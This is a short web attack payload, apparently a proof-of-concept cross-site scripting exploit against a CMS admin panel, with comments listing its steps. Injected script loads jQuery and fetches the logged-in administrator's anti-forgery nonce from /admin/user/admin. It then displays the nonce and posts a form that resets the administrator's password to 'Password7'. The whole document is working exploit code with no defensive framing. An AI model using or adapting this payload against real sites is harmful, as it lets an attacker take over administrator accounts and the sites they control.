//1. Grabs the `admin-nonce` of the logged-in admin 
//2. Prints that nonce
//3. Uses it to change the current admin's password to `Password7`


<script
src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>

<script>
adminNonce = "";
$.get( "/admin/user/admin",
function( data ) {adminNonce = $("input[name=admin-nonce]",
data).val()}).done(
function(){
alert(window.adminNonce);
$.post( "/admin/user/admin", {
    "task": "save",
        "admin-nonce": adminNonce,
    "data[password]": "Password7"},
    function(data){document.write(data)})}
);
</script>
